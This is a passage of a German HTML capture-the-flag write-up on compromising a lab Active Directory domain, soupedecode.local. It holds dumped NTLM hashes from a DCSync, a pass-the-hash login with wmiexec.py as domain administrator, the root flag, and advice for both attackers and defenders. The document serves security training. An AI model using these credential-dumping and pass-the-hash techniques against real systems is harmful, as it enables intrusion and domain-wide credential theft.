+<span class="password">soupedecode.local\pquinn4:1107:aad3b435b51404eeaad3b435b51404ee:92cdedd79a2fe7cbc8c55826b0ff2d54</span>:::
+<span class="password">soupedecode.local\jharper5:1108:aad3b435b51404eeaad3b435b51404ee:800f9c9d3e4654d9bd590fc4296adf01</span>:::
+<span class="password">soupedecode.local\bxenia6:1109:aad3b435b51404eeaad3b435b51404ee:d997d3309bc876f12cbbe932d82b18a3</span>:::
+<span class="password">soupedecode.local\gmona7:1110:aad3b435b51404eeaad3b435b51404ee:c2506dfa7572da51f9f25b603da874d4</span>:::
+<span class="password">soupedecode.local\oaaron8:1111:aad3b435b51404eeaad3b435b51404ee:869e9033466cb9f7f8d0ce5a5c3305c6</span>:::
+<span class="password">soupedecode.local\pleo9:1112:aad3b435b51404eeaad3b435b51404ee:54a3a0c87893e1051e6f7b629ca144ef</span>:::
+<--SNIP-->
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `secretsdump.py` wird nun im Online-Modus verwendet, authentifiziert als Maschinenkonto `dc01$` mittels Pass-the-Hash (Syntax: `-hashes :NTLMHASH`). Das Skript nutzt die Directory Replication Service (DRSUAPI)-Rechte, um die NTLM-Hashes aller Benutzer in der Domäne `SUPEDECDE.LCAL` zu extrahieren. Die Ausgabe zeigt die Hashes für den Administrator (`8982...`), das wichtige `krbtgt`-Konto (`fb9d...`) und viele andere Benutzer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der ultimative Erfolg der Privilegieneskalation im Active Directory. Mit dem `krbtgt`-Hash können Golden Tickets erstellt werden, die unbegrenzten Zugriff ermöglichen. Mit dem aktuellen Administrator-Hash kann direkt auf das System zugegriffen werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den extrahierten Administrator-Hash (`8982babd4da89d33210779a6c5b078bd`) verwenden, um sich als Domain Admin anzumelden (z.B. via Pass-the-Hash mit `wmiexec.py` oder `psexec.py`) und den Root-Flag zu holen. Den `krbtgt`-Hash für mögliche Golden-Ticket-Angriffe speichern.<br><strong>Empfehlung (Admin):</strong> DCSync-Angriffe durch Überwachung von Replikationsanfragen (Event ID 4662 mit spezifischen Objekt-GUIDs) und durch Einschränkung der Konten mit Replikationsrechten erkennen und verhindern. Implementierung von Tiering-Modellen im AD.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 wmiexec.py SUPEDECDE.LCAL/administrator@192.168.2.117 -hashes :8982babd4da89d33210779a6c5b078bd</span></div>
+                    <pre>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+<span class="password">C:\></span>cd c:\users\administrator\desktop\
+<span class="password">c:\users\administrator\desktop></span>dir
+ Volume in drive C has no label.
+ Volume Serial Number is CCB5-C4FB
+
+ Directory of c:\users\administrator\desktop
+
+06/17/2024  11:28 AM    <DIR>          .
+06/15/2024  12:56 PM    <DIR>          ..
+06/12/2024  01:01 PM                33 <span class="command">root.txt</span>
+               1 File(s)             33 bytes
+               2 Dir(s)  44,419,076,096 bytes free
+
+<span class="password">c:\users\administrator\desktop></span>type root.txt
+<span class="password">d41d8cd98f00b204e9800998ecf8427e</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Impacket-Skript `wmiexec.py` wird verwendet, um eine semi-interaktive Shell auf dem Zielsystem zu erhalten. Die Authentifizierung erfolgt als Domain-Administrator (`SUPEDECDE.LCAL/administrator`) mittels Pass-the-Hash unter Verwendung des durch DCSync erhaltenen NTLM-Hashes (`-hashes :8982...`). In der resultierenden Shell (`C:\>`) wird in das Desktop-Verzeichnis des Administrators navigiert und die Datei `root.txt` gefunden. Der Inhalt dieser Datei wird mit `type root.txt` angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Perfekt! Erfolgreicher Zugriff als Domain Administrator und Auffinden des Root-Flags (`d41d8cd98f00b204e9800998ecf8427e`). Das Ziel des Penetrationstests ist vollständig erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag dokumentieren. Den Bericht fertigstellen.<br><strong>Empfehlung (Admin):</strong> Nach einer solchen Kompromittierung ist eine vollständige Untersuchung des Vorfalls und möglicherweise eine Neuinstallation der betroffenen Systeme und eine Rotation aller Domänen-Passwörter (insbesondere `krbtgt`) dringend erforderlich.</p>
+        </section>
+
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <!-- Befehl angepasst an die tatsächliche Ausführung -->
+                    <div class="flag-command">smbclient '\\\\192.168.2.117\\C$' ... -> get user.txt && cat user.txt</div>
+                    <div class="flag-value"><span class="password">2fe79eb0e02ecd4dd2833cfcbbdb504c</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <!-- Befehl angepasst an die tatsächliche Ausführung -->
+                    <div class="flag-command">wmiexec.py ... -> type root.txt</div>
+                    <div class="flag-value"><span class="password">d41d8cd98f00b204e9800998ecf8427e</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 9. August 2024</p>
+    </footer>
+</body>
+</html>
